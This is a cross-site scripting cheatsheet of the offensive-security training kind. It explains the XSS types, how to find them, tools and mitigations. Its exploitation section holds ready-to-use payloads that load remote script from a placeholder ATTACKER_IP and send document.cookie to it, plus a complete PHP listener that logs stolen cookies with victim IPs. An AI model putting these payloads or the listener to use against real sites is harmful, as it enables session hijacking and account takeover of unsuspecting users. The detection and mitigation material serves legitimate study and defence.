# Cross-Site Scripting (XSS) Cheatsheet

## Introduction
Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users.

### Types of XSS
1.  **Stored (Persistent) XSS**: Malicious script is stored on the server (e.g., database, comment field) and executed when a user views the stored data.
2.  **Reflected (Non-Persistent) XSS**: Malicious script is reflected off the web server (e.g., in an error message or search result) and executed immediately. Requires a user to click a link.
3.  **DOM-based XSS**: Vulnerability exists in client-side code (JavaScript) rather than server-side code. The attack payload is executed by modifying the DOM environment in the victim's browser.

---

## Methodology for Finding XSS
1.  **Test Input Fields**: Check all input fields for reflected output.
2.  **Test Generators/Parsers**: Check PDF generators or HTML parsers for HTML injection.
3.  **Blind XSS**: Test contact forms, feedback forms, and "User-Agent" headers.
4.  **Source & Sink (DOM)**: Review JavaScript code for sources (URL parameters, inputs) and sinks (`innerHTML`, `document.write`).

---

## Exploitation

### Basic Payloads
Test for execution using simple alerts or print dialogs.
```html
<script>alert(window.origin)</script>
<script>print()</script>
<plaintext>
```

### Blind XSS
Used when you cannot see the output (e.g., admin panels).
1.  **Remote Script Loading**:
    ```html
    <script src="http://ATTACKER_IP/script.js"></script>
    ```
    *Tip: Append the field name to the URL to identify which field is vulnerable (e.g., `/username`).*

2.  **Payloads**:
    ```html
    <script src=http://ATTACKER_IP></script>
    '><script src="http://ATTACKER_IP/script.js"></script>
    "><script src="http://ATTACKER_IP/script.js"></script>
    javascript:eval('var a=document.createElement(\'script\');a.src=\'http://ATTACKER_IP\';document.body.appendChild(a)')
    ```

### Session Hijacking
Steal user cookies to take over their session.

**Payload (Direct):**
```html
<script>new Image().src='http://ATTACKER_IP/index.php?c='+document.cookie;</script>
```

**Payload (Remote Script - `script.js`):**
```javascript
new Image().src='http://ATTACKER_IP/index.php?c='+document.cookie;
```

**Listener (PHP):**
Save as `index.php` and run `php -S 0.0.0.0:8000`.
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### DOM-Based XSS
Identify **Sources** (input) and **Sinks** (execution).

**Common Sinks:**
-   `document.write()`
-   `element.innerHTML`
-   `element.outerHTML`
-   jQuery: `add()`, `after()`, `append()`

**Example:**
If source is `document.URL` and sink is `innerHTML`:
```javascript
// URL: http://site.com?task=<script>alert(1)</script>
var task = document.URL.substring(...);
document.getElementById("todo").innerHTML = task;
```

---

## Tools

### Automated Scanners
-   **XSStrike**: Advanced XSS detection suite.
    ```bash
    python xsstrike.py -u "http://target.com/index.php?task=test"
    ```
-   **Burp Suite**: Active and Passive scanning.
-   **ZAP**: OWASP ZAP scanner.

### Payloads
-   [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
-   [XSS Payload List](https://github.com/payloadbox/xss-payload-list)

---

## Mitigation

### Front-End
1.  **Input Validation**: Validate data type and format (e.g., email regex).
2.  **Input Sanitization**: Use libraries like [DOMPurify](https://github.com/cure53/DOMPurify) to remove malicious tags.
3.  **Avoid Dangerous Sinks**: Do not use `innerHTML` or `document.write` with user input. Use `textContent` or `innerText` instead.

### Back-End
1.  **Input Validation**: Validate input on the server side.
2.  **Output Encoding**: Encode special characters before rendering them (e.g., `<` becomes `&lt;`).
    -   PHP: `htmlspecialchars()` or `htmlentities()`
    -   Node.js: `html-entities` library.
3.  **Content Security Policy (CSP)**: Restrict where scripts can be loaded from.
    ```http
    Content-Security-Policy: script-src 'self'
    ```
4.  **HttpOnly & Secure Flags**: Set cookies with `HttpOnly` (prevents JS access) and `Secure` (HTTPS only).
5.  **WAF**: Use a Web Application Firewall.
